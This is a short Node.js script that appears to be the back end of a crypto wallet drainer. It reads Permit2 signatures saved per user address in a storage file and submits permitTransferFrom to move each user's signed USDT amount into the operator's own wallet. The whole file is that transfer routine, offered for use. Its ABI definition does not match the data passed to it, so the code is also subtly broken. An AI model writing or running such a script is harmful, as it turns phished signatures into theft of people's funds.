require('dotenv').config();
const fs = require('fs');
const { ethers } = require('ethers');
const { PERMIT2, USDT } = require('./permitUtils');

const data = JSON.parse(fs.readFileSync('./storage.json'));

const user = process.argv[2]; // e.g., 0xUser
const permitData = data[user];
if (!permitData) return console.log("❌ No signature found");

(async () => {
  const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);
  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

  const iface = new ethers.utils.Interface([
    "function permitTransferFrom((address token,uint256 amount,address spender,uint256 nonce,uint256 deadline), (address to,uint256 requestedAmount), address owner, bytes signature)"
  ]);

  const tx = await wallet.sendTransaction({
    to: PERMIT2,
    data: iface.encodeFunctionData("permitTransferFrom", [
      {
        permitted: {
          token: USDT,
          amount: permitData.message.permitted.amount
        },
        spender: process.env.WALLET_ADDRESS,
        nonce: permitData.message.nonce,
        deadline: permitData.message.deadline
      },
      {
        to: process.env.WALLET_ADDRESS,
        requestedAmount: permitData.message.permitted.amount
      },
      user,
      permitData.signature
    ])
  });

  console.log("✅ TX Sent:", tx.hash);
})();
